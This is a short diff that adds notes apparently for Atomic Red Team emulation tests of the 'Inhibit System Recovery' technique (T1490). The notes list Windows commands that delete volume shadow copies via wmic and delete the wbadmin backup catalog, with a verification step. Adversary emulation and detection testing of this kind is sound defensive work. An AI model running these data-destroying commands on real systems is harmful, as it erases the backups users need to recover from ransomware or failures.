@@ -1,0 +1,18 @@
+################T1490.md################
+
+##Atomic Test #2 - Windows - Delete Volume Shadow Copies via WMI
+
+```wmic.exe shadowcopy```
+```wmic.exe shadowcopy delete```
+
+#Evidencia
+```wmic.exe shadowcopy```
+
+```PAUSE```
+
+
+##Atomic Test #3 - Windows - wbadmin Delete Windows Backup Catalog
+
+```wbadmin delete catalog -quiet```
+
+```PAUSE```
